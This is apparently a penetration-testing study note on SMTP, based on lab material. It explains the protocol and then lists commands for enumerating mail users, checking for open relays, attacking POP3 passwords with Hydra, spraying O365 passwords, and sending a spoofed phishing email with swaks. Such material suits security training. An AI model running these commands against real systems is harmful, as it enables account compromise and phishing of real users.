# **SMTP**

## **Simple mail transfer protocol 25, or 465,587**

The Simple Mail Transfer Protocol (SMTP) is used for sending emails within an IP network. It operates between an email client and an outgoing mail server or between two SMTP servers. SMTP is often paired with IMAP or POP3, which handle fetching and sending emails. Although SMTP is fundamentally a client-server-based protocol, it can be used both between a client and a server and between two SMTP servers, where one server acts as a client.

## Default and Alternative Ports

SMTP servers typically accept connections on port 25. However, newer SMTP servers also use ports like TCP port 587, which is employed to receive mail from authenticated users or servers. This often involves the STARTTLS command to switch from a plaintext to an encrypted connection, protecting authentication data from being visible in plaintext over the network.

## Connection and Authentication

At the start of the connection, the client authenticates itself with a username and password. The client then sends the server the sender and recipient addresses, the email's content, and other parameters. Once the email is transmitted, the connection is terminated, and the email server forwards the email to another SMTP server.

## Encryption and Security

SMTP transmits all commands, data, and authentication information in plain text unless additional encryption measures are used. To prevent unauthorized data access, SMTP can be used with SSL/TLS encryption, often on ports other than the default TCP port 25, such as TCP port 465.

An essential function of an SMTP server is spam prevention. This is achieved using authentication mechanisms that allow only authorized users to send emails. Modern SMTP servers often support the ESMTP protocol extension with SMTP-Auth. After an email is sent, the SMTP client, also known as a Mail User Agent (MUA), converts it into a header and a body and uploads both to the SMTP server, which uses a Mail Transfer Agent (MTA) for sending and receiving emails. The MTA checks the email for size and spam before storing it. Sometimes, a Mail Submission Agent (MSA) precedes the MTA to verify the email's origin. This MSA, or Relay server, is crucial as misconfigured SMTP servers can be vulnerable to Open Relay Attacks.

## Email Delivery Process

When an email reaches the destination SMTP server, data packets are reassembled into a complete email. The Mail Delivery Agent (MDA) then transfers it to the recipient's mailbox.

Email flow: Client (MUA) ➞ Submission Agent (MSA) ➞ Open Relay (MTA) ➞ Mail Delivery Agent (MDA) ➞ Mailbox (POP3/IMAP)

## Disadvantages of SMTP

SMTP has two main disadvantages:
1. **Lack of Delivery Confirmation**: SMTP does not guarantee a usable delivery confirmation. While the protocol specifications include this feature, the formatting is not standardized, usually resulting in an English-language error message.
2. **Lack of Sender Authentication**: SMTP does not authenticate users when establishing a connection, making the sender of an email unreliable. This can lead to open SMTP relays being misused to send spam. Spammers often use fake sender addresses to avoid being traced (mail spoofing).

To combat these issues, various security techniques are employed, such as rejecting or quarantining suspicious emails. Protocols like DomainKeys (DKIM) and the Sender Policy Framework (SPF) are used for identification.

## Extended SMTP (ESMTP)
An extension of SMTP, called Extended SMTP (ESMTP), addresses some of these issues. When people refer to SMTP, they often mean ESMTP. ESMTP uses TLS after the EHLO command by sending STARTTLS, initializing an SSL-protected SMTP connection. From this point, the connection is encrypted and secure, allowing for the safe use of the AUTH PLAIN extension for authentication.

--------------------------------------------------------------------

To interact with the SMTP server, we can use the `telnet` tool to initialize a TCP connection with the SMTP server. The actual initialization of the session is done with the command mentioned above, `HELO` or `EHLO`.

```shell-session
$ telnet 10.129.14.128 25
```
#### Telnet - VRFY
```shell-session
telnet 10.129.14.128 25
```
```shell-session
VRFY root
VRFY cry0l1t3
```

Sometimes we may have to work through a web proxy. We can also make this web proxy connect to the SMTP server. The command that we would send would then look something like this: `CONNECT 10.129.14.128:25 HTTP/1.0`

#### Send an Email
```shell-session
telnet 10.129.14.128 25
EHLO inlanefreight.htb
MAIL FROM: <cry0l1t3@inlanefreight.htb>
RCPT TO: <mrb3n@inlanefreight.htb> NOTIFY=success,failure
DATA
QUIT
```

#### Open Relay Configuration

  SMTP

```shell-session
mynetworks = 0.0.0.0/0
```

With this setting, the SMTP server can send fake emails, initiating communication between multiple parties. Additionally, another attack vector is email spoofing, where the attacker can send emails that appear to be from a legitimate source and potentially intercept and read the email content.

# Footprinting

```shell-session
$ sudo nmap 10.129.14.128 -sC -sV -p25
```
```shell-session
$ sudo nmap 10.129.14.128 -p25 --script smtp-open-relay -v
```
```shell-session
$ smtp-user-enum -M VRFY -u list.txt -t 10.129.32.56 -w 15 -v

```
```shell-session
$ smtp-user-enum -M RCPT -U userlist.txt -D inlanefreight.htb -t 10.129.203.7
```
#### Hydra - Password Attack
```shell-session
$ hydra -L users.txt -p 'Company01!' -f 10.10.110.20 pop3
```
#### O365 Spray
```shell-session
$ python3 o365spray.py --validate --domain msplaintext.xyz
```
```shell-session
$ python3 o365spray.py --enum -U users.txt --domain msplaintext.xyz
```
```shell-session
$ python3 o365spray.py --spray -U usersfound.txt -p 'March2022!' --count 1 --lockout 1 --domain msplaintext.xyz
```

--------------------------------------------------------------------
#### Host - MX Records
```shell-session
$ host -t MX hackthebox.eu
```
```shell-session
$ host -t MX microsoft.com
```
#### DIG - MX Records
```shell-session
$ dig mx plaintext.do | grep "MX" | grep -v ";"
```
```shell-session
$ dig mx inlanefreight.com | grep "MX" | grep -v ";"
```
#### Host - A Records
```shell-session
$ host -t A mail1.inlanefreight.htb.
```
If we are targetting a custom mail server implementation such as `inlanefreight.htb`, we can enumerate the following ports:

|**Port**|**Service**|
|---|---|
|`TCP/25`|SMTP Unencrypted|
|`TCP/143`|IMAP4 Unencrypted|
|`TCP/110`|POP3 Unencrypted|
|`TCP/465`|SMTP Encrypted|
|`TCP/587`|SMTP Encrypted/[STARTTLS](https://en.wikipedia.org/wiki/Opportunistic_TLS)|
|`TCP/993`|IMAP4 Encrypted|
|`TCP/995`|POP3 Encrypted|

### SCRIPT usage to VRFY users:
```
$ python3 smtp_user_enum.py root 0.0.0.0
```
#### VRFY Command
```shell-session
$ telnet 10.10.110.20 25
```
```shell-session
VRFY root
```
```shell-session
VRFY www-data
```
`EXPN` is similar to `VRFY`, except that when used with a distribution list, it will list all users on that list. This can be a bigger problem than the `VRFY` command since sites often have an alias such as "all."
#### EXPN Command
```shell-session
$ telnet 10.10.110.20 25
```
```shell-session
EXPN john
```
```shell-session
EXPN support-team
```
`RCPT TO` identifies the recipient of the email message. This command can be repeated multiple times for a given message to deliver a single message to multiple recipients.

#### RCPT TO Command
```shell-session
$ telnet 10.10.110.20 25
```
```shell-session
MAIL FROM:test@htb.com
it is
250 2.1.0 test@htb.com... Sender ok


RCPT TO:julio

550 5.1.1 julio... User unknown


RCPT TO:kate

550 5.1.1 kate... User unknown


RCPT TO:john

250 2.1.5 john... Recipient ok
```
#### USER Command
```shell-session
USER julio

-ERR


USER john

+OK
```
#### Open Relay
From an attacker's standpoint, we can abuse this for phishing by sending emails as non-existing users or spoofing someone else's email. For example, imagine we are targeting an enterprise with an open relay mail server, and we identify they use a specific email address to send notifications to their employees. We can send a similar email using the same address and add our phishing link with this information. With the `nmap smtp-open-relay` script, we can identify if an SMTP port allows an open relay.
```shell-session
# nmap -p25 -Pn --script smtp-open-relay 10.10.11.213
```
```shell-session
# swaks --from notifications@inlanefreight.com --to employees@inlanefreight.com --header 'Subject: Company Notification' --body 'Hi All, we want to hear from you! Please complete the following survey. http://mycustomphishinglink.com/' --server 10.10.11.213

=== Trying 10.10.11.213:25...
=== Connected to 10.10.11.213.
<-  220 mail.localdomain SMTP Mailer ready
 -> EHLO parrot
<-  250-mail.localdomain
<-  250-SIZE 33554432
<-  250-8BITMIME
<-  250-STARTTLS
<-  250-AUTH LOGIN PLAIN CRAM-MD5 CRAM-SHA1
<-  250 HELP
 -> MAIL FROM:<notifications@inlanefreight.com>
<-  250 OK
 -> RCPT TO:<employees@inlanefreight.com>
<-  250 OK
 -> DATA
<-  354 End data with <CR><LF>.<CR><LF>
 -> Date: Thu, 29 Oct 2020 01:36:06 -0400
 -> To: employees@inlanefreight.com
 -> From: notifications@inlanefreight.com
 -> Subject: Company Notification
 -> Message-Id: <20201029013606.775675@parrot>
 -> X-Mailer: swaks v20190914.0 jetmore.org/john/code/swaks/
 -> 
 -> Hi All, we want to hear from you! Please complete the following survey. http://mycustomphishinglink.com/
 -> 
 -> 
 -> .
<-  250 OK
 -> QUIT
<-  221 Bye
=== Connection closed with remote host.
```

### Metasploit

```
$ msfconsole 

> auxiliary/scanner/smtp/...
```

--------------------------------------------------------------------

## WINDOWS:
```Powershell
PS C:\Windows\system32> Test-NetConnection -Port 25 192.168.50.8

Telnet install:
PS C:\Windows\system32> dism /online /Enable-Feature /FeatureName:TelnetClient

PS C:\Windows\system32> telnet 192.168.50.8 25
```
